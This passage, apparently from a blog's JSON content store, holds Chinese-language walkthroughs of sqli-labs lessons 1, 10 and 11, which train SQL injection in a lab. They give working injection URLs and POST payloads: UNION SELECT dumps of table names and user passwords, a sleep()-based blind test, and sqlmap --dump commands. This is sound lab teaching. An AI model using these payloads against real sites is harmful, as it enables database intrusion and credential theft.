(基于错误的GET单引号字符型注入)\"></a>sqli-labs lession 1 (基于错误的GET单引号字符型注入)</h1><hr>\n<h2 id=\"登录界面\"><a href=\"#登录界面\" class=\"headerlink\" title=\"登录界面\"></a>登录界面</h2><p><img src=\"/img/sql/lesson1/1.PNG\" alt=\"001\"></p>\n<h2 id=\"手注\"><a href=\"#手注\" class=\"headerlink\" title=\"手注\"></a>手注</h2><h3 id=\"判断注入类型\"><a href=\"#判断注入类型\" class=\"headerlink\" title=\"判断注入类型\"></a>判断注入类型</h3><blockquote>\n<p>sqli-labs 第一课很人性化地给予提示,在url处添加id。</p>\n</blockquote>\n<p><code>http://10.60.250.214/Less-1/?id=1</code><br><img src=\"/img/sql/lesson1/2.png\" alt=\"002\"></p>\n<blockquote>\n<p>由于是get请求方法,以后碰到就直接填写了。</p>\n</blockquote>\n<p>输入单引号</p>\n<p><code>http://10.60.250.214/Less-1/?id=1&#39;</code></p>\n<p><img src=\"/img/sql/lesson1/3.png\" alt=\"003\"></p>\n<p>引起报错<br><code>You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#39;&#39;1&#39;&#39; LIMIT 0,1&#39; at line 1</code></p>\n<p>根据报错信息,猜测加入的id’参数在SQL语句中应该被对称的单引号包含。</p>\n<p>继续验证猜想:</p>\n<p><code>http://10.60.250.214/Less-1/?id=1&#39; and &#39;1&#39;=&#39;1</code></p>\n<p>页面正常，这里不贴图了</p>\n<p>继续检验</p>\n<p><code>http://10.60.250.214/Less-1/?id=1&#39; and &#39;1&#39;=&#39;2</code></p>\n<p>页面异常</p>\n<p><img src=\"/img/sql/lesson1/4.png\" alt=\"004\"></p>\n<p>存在字符型的注入</p>\n<p>在搭建的服务中可以查看SQL语句是怎么写的,就是下图中标记部分</p>\n<p><img src=\"/img/sql/lesson1/5.png\" alt=\"005\"></p>\n<p><code>$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;</code></p>\n<p>通过get请求提交的数据会被$id接收,举个例子，上图中<code>1&#39; and &#39;1&#39;=&#39;2</code>就是我手动输入的部分,在SQL语句中就变成这样:</p>\n<p><code>SELECT * FROM users WHERE id=&#39;1&#39; and &#39;1&#39;=&#39;2&#39; LIMIT 0,1</code></p>\n<p>可以发现我构造的单引号与SQL语句中的单引号形成了对称,最终变成了一个正常的SQL语句。</p>\n<p>但是单单这样还是不够的,<code>and &#39;1&#39;=&#39;2&#39; LIMIT 0,1</code>在SQL语句中还是会执行,可能会对我输入进行干扰。这就需要注释了。</p>\n<p>mysql的注释方式有以下几种：</p>\n<ul>\n<li><p>第一种:#    </p>\n<p>  #在url中编码为<code>%23</code></p>\n</li>\n<li><p>第二种:– (注意–后面还有个空格)</p>\n<p>  空格的编码是<code>%20</code></p>\n</li>\n<li><p>第三种:–+ </p>\n<p>  第二种的变形,浏览器会把<code>+</code>编码成空格</p>\n</li>\n</ul>\n<p><code>&#39;</code>的url编码为<code>%27</code>,下面的测试先把单引号用<code>%27</code>表示,空格用<code>%20</code>表示,#用<code>%23</code>,避免出问题。在url中输入如下:</p>\n<blockquote>\n<p>第一种:#</p>\n</blockquote>\n<p><code>http://10.60.250.214/Less-1/?id=1%27%20%23</code></p>\n<p><img src=\"/img/sql/lesson1/6.png\" alt=\"006\"></p>\n<blockquote>\n<p>第二种：– (注意–后面还有个空格)</p>\n</blockquote>\n<p><code>http://10.60.250.214/Less-1/?id=1%27%20--%20</code></p>\n<p><img src=\"/img/sql/lesson1/7.png\" alt=\"007\"></p>\n<blockquote>\n<p>第三种:–+</p>\n</blockquote>\n<p><code>http://10.60.250.214/Less-1/?id=1%27%20--+</code></p>\n<p><img src=\"/img/sql/lesson1/8.png\" alt=\"008\"></p>\n<h3 id=\"猜字段\"><a href=\"#猜字段\" class=\"headerlink\" title=\"猜字段\"></a>猜字段</h3><h4 id=\"猜字段数\"><a href=\"#猜字段数\" class=\"headerlink\" title=\"猜字段数\"></a>猜字段数</h4><p>这里我采用第一种注释方式,当然其他的也可以。</p>\n<p><code>http://10.60.250.214/Less-1/?id=1%27%20order%20by%203%23</code></p>\n<p>这里我换了个hackbar插件,原来那个有bug</p>\n<p><img src=\"/img/sql/lesson1/9.png\" alt=\"009\"></p>\n<p>order by 数字1~3显示的都与这个页面相同,表示至少有3个字段</p>\n<p><code>http://10.60.250.214/Less-1/?id=1%27%20order%20by%204%23</code></p>\n<p><img src=\"/img/sql/lesson1/10.png\" alt=\"010\"></p>\n<p>图片上的报错信息是:</p>\n<p><code>SELECT * FROM users WHERE id=&#39;1&#39; order by 4#&#39; LIMIT 0,1\nUnknown column &#39;4&#39; in &#39;order clause&#39;</code></p>\n<p>说明第4个字段不存在,那就只有3个字段。</p>\n<h4 id=\"猜字段排序\"><a href=\"#猜字段排序\" class=\"headerlink\" title=\"猜字段排序\"></a>猜字段排序</h4><p>使用union select联合查询,后面接查到的字段个数。如下:</p>\n<p><code>http://10.60.250.214/Less-1/?id=1%27%20union%20select%201,2,3%23</code></p>\n<p><img src=\"/img/sql/lesson1/11.png\" alt=\"011\"></p>\n<p>可是怎么让我填写的数字显示出来呢,这就是个问题了,查看一下源码:</p>\n<p><img src=\"/img/sql/lesson1/12.png\" alt=\"012\"></p>\n<p>标记的位置就是关键函数。mysql_fetch_array函数会从返回查询到的数据的一行,这里我查询到的是id=1的数据,改变id能查询到另外的数据,修改id=2。</p>\n<p><code>http://10.60.250.214/Less-1/?id=2%27%20union%20select%201,2,3%23</code></p>\n<p><img src=\"/img/sql/lesson1/13.png\" alt=\"013\"></p>\n<p>显示出id=2的数据信息。</p>\n<p>将id修改为数据表中不可能存在的一个数,前面查询会变为空,执行我们的联合查询语句。这里将id修改为-1。</p>\n<p><code>http://10.60.250.214/Less-1/?id=-1%27%20union%20select%201,2,3%23</code></p>\n<p><img src=\"/img/sql/lesson1/14.png\" alt=\"014\"></p>\n<p>显示出字段顺序,推测字段中排序顺序应该是id,name,password。</p>\n<h3 id=\"获取数据库信息\"><a href=\"#获取数据库信息\" class=\"headerlink\" title=\"获取数据库信息\"></a>获取数据库信息</h3><p>user():返回当前数据库连接使用的用户</p>\n<p>database():返回当前数据库连接使用的数据库</p>\n<p>version():返回当前数据库的版本</p>\n<p><code>http://10.60.250.214/Less-1/?id=-1%27%20union%20select%201,user(),database()%23</code></p>\n<p><img src=\"/img/sql/lesson1/15.png\" alt=\"015\"></p>\n<h3 id=\"获取表\"><a href=\"#获取表\" class=\"headerlink\" title=\"获取表\"></a>获取表</h3><p>group_concat函数:将查询到的多行结果连接成字符串</p>\n<p><code>http://10.60.250.214/Less-1/?id=-1%27%20union%20select%201,user(),group_concat(table_name) from information_schema.tables where table_schema=database()%23</code></p>\n<p><img src=\"/img/sql/lesson1/16.png\" alt=\"016\"></p>\n<h3 id=\"获取字段\"><a href=\"#获取字段\" class=\"headerlink\" title=\"获取字段\"></a>获取字段</h3><p><code>http://10.60.250.214/Less-1/?id=-1%27%20union%20select%201,%20user(),group_concat(column_name)%20from%20INFORMATION_SCHEMA.COLUMNS%20WHERE%20TABLE_NAME=%27users%27%23</code></p>\n<p><img src=\"/img/sql/lesson1/17.png\" alt=\"017\"></p>\n<h3 id=\"获取值\"><a href=\"#获取值\" class=\"headerlink\" title=\"获取值\"></a>获取值</h3><p><code>http://10.60.250.214/Less-1/?id=-1&#39; union select 1,2,group_concat(username,&#39;:&#39;,password) from users%23</code></p>\n<p><img src=\"/img/sql/lesson1/18.png\" alt=\"018\"></p>\n<h2 id=\"SQLMAP\"><a href=\"#SQLMAP\" class=\"headerlink\" title=\"SQLMAP\"></a>SQLMAP</h2><h3 id=\"基础命令\"><a href=\"#基础命令\" class=\"headerlink\" title=\"基础命令\"></a>基础命令</h3><p>SQLMAP的基础命令如下：</p>\n<blockquote>\n<p>列举数据库</p>\n</blockquote>\n<p>sqlmap -u “注入地址” -v 1 –-dbs</p>\n<blockquote>\n<p>当前数据库</p>\n</blockquote>\n<p>sqlmap -u “注入地址” -v 1 –-current-db</p>\n<blockquote>\n<p>列数据库用户</p>\n</blockquote>\n<p>sqlmap -u “注入地址” -v 1 –-users</p>\n<blockquote>\n<p>当前用户</p>\n</blockquote>\n<p>sqlmap -u “注入地址” -v 1 –-current-user</p>\n<blockquote>\n<p>列举数据库的表名</p>\n</blockquote>\n<p>sqlmap -u “注入地址” -v 1 -D “数据库” –-tables</p>\n<blockquote>\n<p>获取表的列名<br>sqlmap.py -u “注入地址” -v 1 -T “表名” -D “数据库” –-columns</p>\n</blockquote>\n<blockquote>\n<p>获取表中的数据<br>sqlmap.py -u “注入地址” -v 1 -T “表名” -D “数据库” -C “字段” –-dump</p>\n</blockquote>\n<h3 id=\"获取数据库\"><a href=\"#获取数据库\" class=\"headerlink\" title=\"获取数据库\"></a>获取数据库</h3><p><strong>-u</strong><br><font color=\"#8470FF\"><br><strong>指定url</strong><br></font></p>\n<p><strong>–dbs</strong><br><font color=\"#8470FF\"><br><strong>爆破数据库</strong><br></font></p>\n<p><strong>–batch</strong><br><font color=\"#8470FF\"><br><strong>默认运行</strong><br></font></p>\n<p><strong>–technique</strong><br><font color=\"#8470FF\"></font></p>\n<p>指定sqlmap使用的检测技术</p>\n<ul>\n<li><p>B:Boolean-based-blind  （布尔型型注入）</p>\n</li>\n<li><p>E:Error-based   （报错型注入）</p>\n</li>\n<li><p>U:Union query-based  （联合注入）</p>\n</li>\n<li><p>S:Starked queries   （通过sqlmap读取文件系统、操作系统、注册表必须 使用该参数，可多语句查询注入）</p>\n</li>\n<li><p>T:Time-based blind  （基于时间延迟注入）</p>\n</li>\n</ul>\n\n\n<p><code>sqlmap -u &quot;http://10.60.250.214/Less-1/?id=1&quot; --dbs --batch --technique B</code></p>\n<p><img src=\"/img/sql/lesson1/20.png\" alt=\"020\"></p>\n<p><img src=\"/img/sql/lesson1/19.png\" alt=\"019\"></p>\n<h3 id=\"获取表-1\"><a href=\"#获取表-1\" class=\"headerlink\" title=\"获取表\"></a>获取表</h3><p><code>sqlmap -u &quot;http://10.60.250.214/Less-1/?id=1&quot; -v 1 -D security --tables</code></p>\n<p><img src=\"/img/sql/lesson1/22.png\" alt=\"022\"></p>\n<p><img src=\"/img/sql/lesson1/21.png\" alt=\"021\"></p>\n<h3 id=\"获取表的列名\"><a href=\"#获取表的列名\" class=\"headerlink\" title=\"获取表的列名\"></a>获取表的列名</h3><p><code>sqlmap -u &quot;http://10.60.250.214/Less-1/?id=1&quot; -v 1 -D security -T users --columns</code></p>\n<p><img src=\"/img/sql/lesson1/24.png\" alt=\"24\"></p>\n<p><img src=\"/img/sql/lesson1/23.png\" alt=\"23\"></p>\n<h3 id=\"获取表中数据\"><a href=\"#获取表中数据\" class=\"headerlink\" title=\"获取表中数据\"></a>获取表中数据</h3><p><code>sqlmap -u &quot;http://10.60.250.214/Less-1/?id=1&quot; -v 1 -D security -T users --columns --dump</code></p>\n<p><img src=\"/img/sql/lesson1/26.png\" alt=\"26\"></p>\n<p><img src=\"/img/sql/lesson1/25.png\" alt=\"25\"></p>\n"},{"title":"sqli-labs-lession 10 GET双引号基于时间盲注","date":"2018-09-26T13:24:52.000Z","_content":"# sqli-labs-lession 10 GET双引号基于时间盲注 #\n---\n\n## 登录界面 ##\n\n![1](/img/sql/Lesson-10/1.png)\n\n## 注入过程 ##\n\n题目已经提示我们了,跟Lesson-9一样是时间盲注,只是SQL语句中变量的闭合使用了双引号。\n\n判断一下类型,其他的和Lesson-9步骤没有区别。\n\n`http://10.60.250.151/sqlilabs/Less-10/?id=1\" and if(1,sleep(60),null)%23`\n\n![2](/img/sql/Lesson-10/2.png)\n\n{% post_link sqli-labs-lession-9-GET单引号基于时间盲注 点击查看Lesson-9%}","source":"_posts/sqli-labs-lession-10-GET双引号基于时间盲注.md","raw":"---\ntitle: sqli-labs-lession 10 GET双引号基于时间盲注\ndate: 2018-09-26 21:24:52\ntags: [sqli-labs]\ncategories: sql注入\n---\n# sqli-labs-lession 10 GET双引号基于时间盲注 #\n---\n\n## 登录界面 ##\n\n![1](/img/sql/Lesson-10/1.png)\n\n## 注入过程 ##\n\n题目已经提示我们了,跟Lesson-9一样是时间盲注,只是SQL语句中变量的闭合使用了双引号。\n\n判断一下类型,其他的和Lesson-9步骤没有区别。\n\n`http://10.60.250.151/sqlilabs/Less-10/?id=1\" and if(1,sleep(60),null)%23`\n\n![2](/img/sql/Lesson-10/2.png)\n\n{% post_link sqli-labs-lession-9-GET单引号基于时间盲注 点击查看Lesson-9%}","slug":"sqli-labs-lession-10-GET双引号基于时间盲注","published":1,"updated":"2019-06-19T17:23:13.385Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjx3istcl001o4dsbh3tc9c7h","content":"<h1 id=\"sqli-labs-lession-10-GET双引号基于时间盲注\"><a href=\"#sqli-labs-lession-10-GET双引号基于时间盲注\" class=\"headerlink\" title=\"sqli-labs-lession 10 GET双引号基于时间盲注\"></a>sqli-labs-lession 10 GET双引号基于时间盲注</h1><hr>\n<h2 id=\"登录界面\"><a href=\"#登录界面\" class=\"headerlink\" title=\"登录界面\"></a>登录界面</h2><p><img src=\"/img/sql/Lesson-10/1.png\" alt=\"1\"></p>\n<h2 id=\"注入过程\"><a href=\"#注入过程\" class=\"headerlink\" title=\"注入过程\"></a>注入过程</h2><p>题目已经提示我们了,跟Lesson-9一样是时间盲注,只是SQL语句中变量的闭合使用了双引号。</p>\n<p>判断一下类型,其他的和Lesson-9步骤没有区别。</p>\n<p><code>http://10.60.250.151/sqlilabs/Less-10/?id=1&quot; and if(1,sleep(60),null)%23</code></p>\n<p><img src=\"/img/sql/Lesson-10/2.png\" alt=\"2\"></p>\n<a href=\"/2018/09/26/sqli-labs-lession-9-GET单引号基于时间盲注/\" title=\"点击查看Lesson-9\">点击查看Lesson-9</a>","site":{"data":{}},"excerpt":"","more":"<h1 id=\"sqli-labs-lession-10-GET双引号基于时间盲注\"><a href=\"#sqli-labs-lession-10-GET双引号基于时间盲注\" class=\"headerlink\" title=\"sqli-labs-lession 10 GET双引号基于时间盲注\"></a>sqli-labs-lession 10 GET双引号基于时间盲注</h1><hr>\n<h2 id=\"登录界面\"><a href=\"#登录界面\" class=\"headerlink\" title=\"登录界面\"></a>登录界面</h2><p><img src=\"/img/sql/Lesson-10/1.png\" alt=\"1\"></p>\n<h2 id=\"注入过程\"><a href=\"#注入过程\" class=\"headerlink\" title=\"注入过程\"></a>注入过程</h2><p>题目已经提示我们了,跟Lesson-9一样是时间盲注,只是SQL语句中变量的闭合使用了双引号。</p>\n<p>判断一下类型,其他的和Lesson-9步骤没有区别。</p>\n<p><code>http://10.60.250.151/sqlilabs/Less-10/?id=1&quot; and if(1,sleep(60),null)%23</code></p>\n<p><img src=\"/img/sql/Lesson-10/2.png\" alt=\"2\"></p>\n<a href=\"/2018/09/26/sqli-labs-lession-9-GET单引号基于时间盲注/\" title=\"点击查看Lesson-9\">点击查看Lesson-9</a>"},{"title":"sqli-labs lession-11 基于错误的POST单引号字符型注入","date":"2018-09-27T01:13:12.000Z","_content":"\n# sqli-labs lession-11 基于错误的POST单引号字符型注入 #\n\n---\n\n## 登录界面 ##\n\n![1](/img/sql/Lesson-11/1.png)\n\n## 手注 ##\n\n### POST ###\n\n这是一个POST请求,可以输入信息查看一下。\n\n分别输入admimn和aad\n\n![2](/img/sql/Lesson-11/2.png)\n\nPOST拿到了我的输入:\n\n![3](/img/sql/Lesson-11/3.png)\n\nhackbar插件勾选Post.自动填充了POST参数。\n\n![4](/img/sql/Lesson-11/4.png)\n\n### 判断类型 ###\n\n那个hackbar在这里不好用,心疼。\n\n![5](/img/sql/Lesson-11/5.png)\n\n返回报错信息,看来单引号是有效果的,添加#注释。\n\n![6](/img/sql/Lesson-11/6.png)\n\n执行成功。接下来的步骤和Lesson-1差不多了。\n\n### 字段数 ###\n\n![7](/img/sql/Lesson-11/7.png)\n\n![8](/img/sql/Lesson-11/8.png)\n\n![9](/img/sql/Lesson-11/9.png)\n\n确定字段数为2。\n\n### 数据库信息 ###\n\n`adminn' union select database(),@@datadir#`\n\n![10](/img/sql/Lesson-11/10.png)\n\n### 获取表 ###\n\n`adminn' union select database(),(select group_concat(table_name,\"--\") from information_schema.tables where table_schema = database())#`\n\n![11](/img/sql/Lesson-11/11.png)\n\n获取到了表名:emails,referers,uagents,users\n\n### 获取字段 ###\n\n`adminn' union select database(),(select group_concat(column_name,\"--\") from information_schema.columns where table_name ='users')#`\n\n![12](/img/sql/Lesson-11/12.png)\n\n获取到了字段:id,username,password\n\n### 获取值 ###\n\n`adminn' union select 1,group_concat(username,\":\",password,\"\\n\") from users#`\n\n![13](/img/sql/Lesson-11/13.png)\n\n## SQLMAP ##\n\nfirefox浏览器设置代理\n\n![14](/img/sql/Lesson-11/14.png)\n\n用Burpsuite抓包,确认接口开启\n\n![15](/img/sql/Lesson-11/15.png)\n\n输入任意字符后点击submit,我这里用的都是xxx\n\n![16](/img/sql/Lesson-11/16.png)\n\nBurpsuite抓到包含POST请求的包\n\n![17](/img/sql/Lesson-11/17.png)\n\n按图保存文件\n\n![18](/img/sql/Lesson-11/18.png)\n\n`sqlmap -r sqlpost/post11.txt -p uname --dbs --technique ES --threads 10`\n\n--threads 选择线程数\n\n-p 指定注入的POST参数\n\n--technique ES\n\nE:Error-based   （报错型注入）\n\nS:Starked queries   （通过sqlmap读取文件系统、操作系统、注册表必须 使用该参数，可多语句查询注入）\n\n![19](/img/sql/Lesson-11/19.png)\n\n`sqlmap -r sqlpost/post11.txt -p uname -D security -T users --columns --dump`\n\n![20](/img/sql/Lesson-11/20.png)","source":"_posts/sqli-labs-lession-11-基于错误的POST单引号字符型注入.md","raw":"---\ntitle: sqli-labs lession-11 基于错误的POST单引号字符型注入\ndate: 2018-09-27 09:13:12\ntags: [sqli-labs]\ncategories: sql注入\n---\n\n# sqli-labs lession-11 基于错误的POST单引号字符型注入 #\n\n---\n\n## 登录界面 ##\n\n![1](/img/sql/Lesson-11/1.png)\n\n## 手注 ##\n\n### POST ###\n\n这是一个POST请求,可以输入信息查看一下。\n\n分别输入admimn和aad\n\n![2](/img/sql/Lesson-11/2.png)\n\nPOST拿到了我的输入:\n\n![3](/img/sql/Lesson-11/3.png)\n\nhackbar插件勾选Post.自动填充了POST参数。\n\n![4](/img/sql/Lesson-11/4.png)\n\n### 判断类型 ###\n\n那个hackbar在这里不好用,心疼。\n\n![5](/img/sql/Lesson-11/5.png)\n\n返回报错信息,看来单引号是有效果的,添加#注释。\n\n![6](/img/sql/Lesson-11/6.png)\n\n执行成功。接下来的步骤和Lesson-1差不多了。\n\n### 字段数 ###\n\n![7](/img/sql/Lesson-11/7.png)\n\n![8](/img/sql/Lesson-11/8.png)\n\n![9](/img/sql/Lesson-11/9.png)\n\n确定字段数为2。\n\n### 数据库信息 ###\n\n`adminn' union select database(),@@datadir#`\n\n![10](/img/sql/Lesson-11/10.png)\n\n### 获取表 ###\n\n`adminn' union select database(),(select group_concat(table_name,\"--\") from information_schema.tables where table_schema = database())#`\n\n![11](/img/sql/Lesson-11/11.png)\n\n获取到了表名:emails,referers,uagents,users\n\n### 获取字段 ###\n\n`adminn' union select database(),(select group_concat(column_name,\"--\") from information_schema.columns where table_name ='users')#`\n\n![12](/img/sql/Lesson-11/12.png)\n\n获取到了字段:id,username,password\n\n### 获取值 ###\n\n`adminn' union select 1,group_concat(username,\":\",password,\"\\n\") from users#`\n\n![13](/img/sql/Lesson-11/13.png)\n\n## SQLMAP ##\n\nfirefox浏览器设置代理\n\n![14](/img/sql/Lesson-11/14.png)\n\n用Burpsuite抓包,确认接口开启\n\n![15](/img/sql/Lesson-11/15.png)\n\n输入任意字符后点击submit,我这里用的都是xxx\n\n![16](/img/sql/Lesson-11/16.png)\n\nBurpsuite抓到包含POST请求的包\n\n![17](/img/sql/Lesson-11/17.png)\n\n按图保存文件\n\n![18](/img/sql/Lesson-11/18.png)\n\n`sqlmap -r sqlpost/post11.txt -p uname --dbs --technique ES --threads 10`\n\n--threads 选择线程数\n\n-p 指定注入的POST参数\n\n--technique ES\n\nE:Error-based   （报错型注入）\n\nS:Starked queries   （通过sqlmap读取文件系统、操作系统、注册表必须 使用该参数，可多语句查询注入）\n\n![19](/img/sql/Lesson-11/19.png)\n\n`sqlmap -r sqlpost/post11.txt -p uname -D security -T users --columns --dump`\n\n![20](/img/sql/Lesson-11/20.png)","slug":"sqli-labs-lession-11-基于错误的POST单引号字符型注入","published":1,"updated":"2019-06-19T17:23:13.385Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjx3istcn001s4dsboi6aye6h","content":"<h1 id=\"sqli-labs-lession-11-基于错误的POST单引号字符型注入\"><a href=\"#sqli-labs-lession-11-基于错误的POST单引号字符型注入\" class=\"headerlink\" title=\"sqli-labs lession-11 基于错误的POST单引号字符型注入\"></a>sqli-labs lession-11 基于错误的POST单引号字符型注入</h1><hr>\n<h2 id=\"登录界面\"><a href=\"#登录界面\" class=\"headerlink\" title=\"登录界面\"></a>登录界面</h2><p><img src=\"/img/sql/Lesson-11/1.png\" alt=\"1\"></p>\n<h2 id=\"手注\"><a href=\"#手注\" class=\"headerlink\" title=\"手注\"></a>手注</h2><h3 id=\"POST\"><a href=\"#POST\" class=\"headerlink\" title=\"POST\"></a>POST</h3><p>这是一个POST请求,可以输入信息查看一下。</p>\n<p>分别输入admimn和aad</p>\n<p><img src=\"/img/sql/Lesson-11/2.png\" alt=\"2\"></p>\n<p>POST拿到了我的输入:</p>\n<p><img src=\"/img/sql/Lesson-11/3.png\" alt=\"3\"></p>\n<p>hackbar插件勾选Post.自动填充了POST参数。</p>\n<p><img src=\"/img/sql/Lesson-11/4.png\" alt=\"4\"></p>\n<h3 id=\"判断类型\"><a href=\"#判断类型\" class=\"headerlink\" title=\"判断类型\"></a>判断类型</h3><p>那个hackbar在这里不好用,心疼。</p>\n<p><img src=\"/img/sql/Lesson-11/5.png\" alt=\"5\"></p>\n<p>返回报错信息,看来单引号是有效果的,添加#注释。</p>\n<p><img src=\"/img/sql/Lesson-11/6.png\" alt=\"6\"></p>\n<p>执行成功。接下来的步骤和Lesson-1差不多了。</p>\n<h3 id=\"字段数\"><a href=\"#字段数\" class=\"headerlink\" title=\"字段数\"></a>字段数</h3><p><img src=\"/img/sql/Lesson-11/7.png\" alt=\"7\"></p>\n<p><img src=\"/img/sql/Lesson-11/8.png\" alt=\"8\"></p>\n<p><img src=\"/img/sql/Lesson-11/9.png\" alt=\"9\"></p>\n<p>确定字段数为2。</p>\n<h3 id=\"数据库信息\"><a href=\"#数据库信息\" class=\"headerlink\" title=\"数据库信息\"></a>数据库信息</h3><p><code>adminn&#39; union select database(),@@datadir#</code></p>\n<p><img src=\"/img/sql/Lesson-11/10.png\" alt=\"10\"></p>\n<h3 id=\"获取表\"><a href=\"#获取表\" class=\"headerlink\" title=\"获取表\"></a>获取表</h3><p><code>adminn&#39; union select database(),(select group_concat(table_name,&quot;--&quot;) from information_schema.tables where table_schema = database())#</code></p>\n<p><img src=\"/img/sql/Lesson-11/11.png\" alt=\"11\"></p>\n<p>获取到了表名:emails,referers,uagents,users</p>\n<h3 id=\"获取字段\"><a href=\"#获取字段\" class=\"headerlink\" title=\"获取字段\"></a>获取字段</h3><p><code>adminn&#39; union select database(),(select group_concat(column_name,&quot;--&quot;) from information_schema.columns where table_name =&#39;users&#39;)#</code></p>\n<p><img src=\"/img/sql/Lesson-11/12.png\" alt=\"12\"></p>\n<p>获取到了字段:id,username,password</p>\n<h3 id=\"获取值\"><a href=\"#获取值\" class=\"headerlink\" title=\"获取值\"></a>获取值</h3><p><code>adminn&#39; union select 1,group_concat(username,&quot;:&quot;,password,&quot;\\n&quot;) from users#</code></p>\n<p><img src=\"/img/sql/Lesson-11/13.png\" alt=\"13\"></p>\n<h2 id=\"SQLMAP\"><a href=\"#SQLMAP\" class=\"headerlink\" title=\"SQLMAP\"></a>SQLMAP</h2><p>firefox浏览器设置代理</p>\n<p><img src=\"/img/sql/Lesson-11/14.png\" alt=\"14\"></p>\n<p>用Burpsuite抓包,确认接口开启</p>\n<p><img src=\"/img/sql/Lesson-11/15.png\" alt=\"15\"></p>\n<p>输入任意字符后点击submit,我这里用的都是xxx</p>\n<p><img src=\"/img/sql/Lesson-11/16.png\" alt=\"16\"></p>\n<p>Burpsuite抓到包含POST请求的包</p>\n<p><img src=\"/img/sql/Lesson-11/17.png\" alt=\"17\"></p>\n<p>按图保存文件</p>\n<p><img src=\"/img/sql/Lesson-11/18.png\" alt=\"18\"></p>\n<p><code>sqlmap -r sqlpost/post11.txt -p uname --dbs --technique ES --threads 10</code></p>\n<p>–threads 选择线程数</p>\n<p>-p 指定注入的POST参数</p>\n<p>–technique ES</p>\n<p>E:Error-based   （报错型注入）</p>\n<p>S:Starked queries   （通过sqlmap读取文件系统、操作系统、注册表必须 使用该参数，可多语句查询注入）</p>\n<p><img src=\"/img/sql/Lesson-11/19.png\" alt=\"19\"></p>\n<p><code>sqlmap -r sqlpost/post11.txt -p uname -D security -T users --columns --dump</code></p>\n<p><img src=\"/img/sql/Lesson-11/20.png\" alt=\"20\"></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"sqli-labs-lession-11-基于错误的POST单引号字符型注入\"><a href=\"#sqli-labs-lession-11-基于错误的POST单引号字符型注入\" class=\"headerlink\" title=\"sqli-labs lession-11 基于错误的POST单引号字符型注入\"></a>sqli-labs lession-11 基于错误的POST单引号字符型注入</h1><hr>\n<h2 id=\"登录界面\"><a href=\"#登录界面\" class=\"headerlink\" title=\"登录界面\"></a>登录界面</h2><p><img src=\"/img/sql/Lesson-11/1.png\" alt=\"1\"></p>\n<h2 id=\"手注\"><a href=\"#手注\" class=\"headerlink\" title=\"手注\"></a>手注</h2><h3 id=\"POST\"><a href=\"#POST\" class=\"headerlink\" title=\"POST\"></a>POST</h3><p>这是一个POST请求,可以输入信息查看一下。</p>\n<p>分别输入admimn和aad</p>\n<p><img src=\"/img/sql/Lesson-11/2.png\" alt=\"2\"></p>\n<p>POST拿到了我的输入:</p>\n<p><img src=\"/img/sql/Lesson-11/3.png\" alt=\"3\"></p>\n<p>hackbar插件勾选Post.自动填充了POST参数。</p>\n<p><img src=\"/img/sql/Lesson-11/4.png\" alt=\"4\"></p>\n<h3 id=\"判断类型\"><a href=\"#判断类型\" class=\"headerlink\" title=\"判断类型\"></a>判断类型</h3><p>那个hackbar在这里不好用,心疼。</p>\n<p><img src=\"/img/sql/Lesson-11/5.png\" alt=\"5\"></p>\n<p>返回报错信息,看来单引号是有效果的,添加#注释。</p>\n<p><img src=\"/img/sql/Lesson-11/6.png\" alt=\"6\"></p>\n<p>执行成功。接下来的步骤和Lesson-1差不多了。</p>\n<h3 id=\"字段数\"><a href=\"#字段数\" class=\"headerlink\" title=\"字段数\"></a>字段数</h3><p><img src=\"/img/sql/Lesson-11/7.png\" alt=\"7\"></p>\n<p><img src=\"/img/sql/Lesson-11/8.png\" alt=\"8\"></p>\n<p><img src=\"/img/sql/Lesson-11/9.png\" alt=\"9\"></p>\n<p>确定字段数为2。</p>\n<h3 id=\"数据库信息\"><a href=\"#数据库信息\" class=\"headerlink\" title=\"数据库信息\"></a>数据库信息</h3><p><code>adminn&#39; union select database(),@@datadir#</code></p>\n<p><img src=\"/img/sql/Lesson-11/10.png\" alt=\"10\"></p>\n<h3 id=\"获取表\"><a href=\"#获取表\" class=\"headerlink\" title=\"获取表\"></a>获取表</h3><p><code>adminn&#39; union select database(),(select group_concat(table_name,&quot;--&quot;) from information_schema.tables where table_schema = database())#</code></p>\n<p><img src=\"/img/sql/Lesson-11/11.png\" alt=\"11\"></p>\n<p>获取到了表名:emails,referers,uagents,users</p>\n<h3 id=\"获取字段\"><a href=\"#获取字段\" class=\"headerlink\" title=\"获取字段\"></a>获取字段</h3><p><code>adminn&#39; union select database(),(select group_concat(column_name,&quot;--&quot;) from information_schema.columns where table_name =&#39;users&#39;)#</code></p>\n<p><img src=\"/img/sql/Lesson-11/12.png\" alt=\"12\"></p>\n<p>获取到了字段:id,username,password</p>\n<h3 id=\"获取值\"><a href=\"#获取值\" class=\"headerlink\" title=\"获取值\"></a>获取值</h3><p><code>adminn&#39; union select 1,group_concat(username,&quot;:&quot;,password,&quot;\\n&quot;) from users#</code></p>\n<p><img src=\"/img/sql/Lesson-11/13.png\" alt=\"13\"></p>\n<h2 id=\"SQLMAP\"><a href=\"#SQLMAP\" class=\"headerlink\" title=\"SQLMAP\"></a>SQLMAP</h2><p>firefox浏览器设置代理</p>\n<p><img src=\"/img/sql/Lesson-11/14.png\" alt=\"14\"></p>\n<p>用Burpsuite抓包,确认接口开启</p>\n<p><img src=\"/img/sql/Lesson-11/15.png\" alt=\"15\"></p>\n<p>输入任意字符后点击submit,我这里用的都是xxx</p>\n<p><img src=\"/img/sql/Lesson-11/16.png\" alt=\"16\"></p>\n<p>Burpsuite抓到包含POST请求的包</p>\n<p><img src=\"/img/sql/Lesson-11/17.png\" alt=\"17\"></p>\n<p>按图保存文件</p>\n<p><img src=\"/img/sql/Lesson-11/18.png\" alt=\"18\"></p>\n<p><code>sqlmap -r sqlpost/post11.txt -p uname --dbs --technique ES --threads 10</code></p>\n<p>–threads 选择线程数</p>\n<p>-p 指定注入的POST参数</p>\n<p>–technique ES</p>\n<p>E:Error-based   （报错型注入）</p>\n<p>S:Starked queries   （通过sqlmap读取文件系统、操作系统、注册表必须 使用该参数，可多语句查询注入）</p>\n<p><img src=\"/img/sql/Lesson-11/19.png\" alt=\"19\"></p>\n<p><code>sqlmap -r sqlpost/post11.txt -p uname -D security -T users --columns --dump</code></p>\n<p><img src=\"/img/sql/Lesson-11/20.png\" 